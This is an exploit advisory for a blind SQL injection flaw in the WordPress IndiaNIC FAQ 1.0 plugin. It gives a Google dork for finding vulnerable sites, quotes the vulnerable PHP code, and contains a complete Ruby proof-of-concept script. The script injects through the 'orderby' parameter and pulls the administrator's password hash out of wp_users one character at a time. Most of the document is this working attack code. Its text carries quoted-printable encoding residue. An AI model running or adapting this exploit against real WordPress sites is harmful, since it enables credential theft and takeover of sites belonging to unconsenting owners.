# Exploit Title: WordPress IndiaNIC FAQ 1.0 Plugin Blind SQL Injection
# Google Dork: inurl:wp-content/plugins/faqs-manager
# Date: 21.03.2013
# Exploit Author: m3tamantra (http://m3tamantra.wordpress.com/blog)
# Vendor Homepage: http://wordpress.org/extend/plugins/faqs-manager/
# Software Link: http://downloads.wordpress.org/plugin/faqs-manager.zip
# Version: 1.0
# Tested on: Apache/2.2.16 (Debian) PHP 5.3.3-7+squeeze14 with Suhosin-Patc=
h (cli)

##############
# Description:
##############
# The "order" and "orderby" parameter is vulnerable for SQL Injection
# Example URL: http://127.0.0.1:9001/wordpress/wp-admin/admin.php?page=3Din=
ic_faq&orderby=3D<sqli>
# PoC take some time to finish (15min on my Testsystem).
# I could speed it up with Multithreading but I'm to lazy right now


#### Vulnerable code part (wp_list_table.php) #############################=
###################################
#
# function prepare_items() {
#  $this->_column_headers =3D array($this->_columns, $this->_hidden_columns=
, $this->_sortable_columns);
#  $sort_order =3D isset($_GET['order']) ? $_GET['order'] : "ASC";
#  $orderby_column =3D isset($_GET['orderby']) ? " ORDER BY {$_GET['orderby=
']} {$sort_order}" : false;
#
#  global $wpdb;
#  if (is_array($this->_sql)) {
#    if ($orderby_column =3D=3D false) {
#      $data =3D $this->_sql;
#    } else {
#      $data =3D $this->_sql;
#      usort($data, array(&$this, 'usort_reorder'));
#    }
#  } else {
#    $data =3D $wpdb->get_results("{$this->_sql}{$orderby_column}", ARRAY_A=
);
#  }
###########################################################################=
#####################################



#################################
#### Blind SQL Injection PoC ####
#################################
require "net/http"
require "uri"

$target =3D "" # EDIT ME #
$cookie =3D "" # EDIT ME # authenticated user session

# Example:
#$target =3D "http://127.0.0.1:9001/wordpress/"
#$cookie =3D "wordpress_a6a5d84619ae3f833460b386c064b9e5=3Dadmin%7C13640405=
45%7C86475c1a4fe1fc1fa5f1ebb04db1bc8f; wp-settings-1=3Deditor%3Dhtml; wp-se=
ttings-time-1=3D1363441353; comment_author_a6a5d84619ae3f833460b386c064b9e5=
=3Dtony; comment_author_email_a6a5d84619ae3f833460b386c064b9e5=3Dtony%40bau=
er.de; comment_author_url_a6a5d84619ae3f833460b386c064b9e5=3Dhttp%3A%2F%2Fs=
ucker.de; wordpress_test_cookie=3DWP+Cookie+check; wordpress_logged_in_a6a5=
d84619ae3f833460b386c064b9e5=3Dadmin%7C1364040545%7Cd7053b96adaa95745023b91=
694bf30ef; PHPSESSID=3D1h7f2o5defu6oa8iti6mqnevc7; bp-activity-oldestpage=
=3D1"

if $target.eql?("") or $cookie.eql?("")
    puts "\n[!]\tPlease set $target and $cookie variable\n"
    raise
end

$chars =3D ["."] + ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
$hash =3D "$P$"
$i =3D 0 # chars index
$j =3D 4 # hash index


def sqli_send()
    sqli =3D URI.escape("(CASE WHEN ((SELECT ASCII(SUBSTRING(user_pass, #{$=
j}, 1)) FROM wp_users WHERE id =3D 1) =3D #{$chars[$i].ord}) THEN 1 ELSE 1*=
(SELECT table_name FROM information_schema.tables)END) --")
    uri =3D URI.parse("#{$target}wp-admin/admin.php?page=3Dinic_faq&orderby=
=3D#{sqli}")
    http =3D Net::HTTP.new(uri.host, uri.port)
    #http.set_debug_output($stderr)
    request =3D Net::HTTP::Get.new(uri.request_uri)
    request["User-Agent"] =3D "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8;=
 rv:19.0) Gecko/20100101 Firefox/19.0"
    request["Cookie"] =3D $cookie
    resp =3D http.request(request)
    if( resp.code !=3D "200" )
        puts "something is wrong response =3D #{resp.code}"
        raise
    end
    # In WordPress default settings there will no SQL error displayed
    # but when an error apperes we don't get any result.
    # The PoC search for "No record found" and suppose there was an error
    return resp.body().match(/No record found/)=20
end

def print_status()
    output =3D "HASH: #{$hash} try #{$chars[$i]}"
    print "\b"*output.length + output
end

while( $hash.length < 34 )
    if( !sqli_send() )
        $hash +=3D $chars[$i]
        $j +=3D 1
        $i =3D 0
    else
        $i +=3D 1
    end
    print_status()
end
puts "\n[+]\thave a nice day :-)\n"
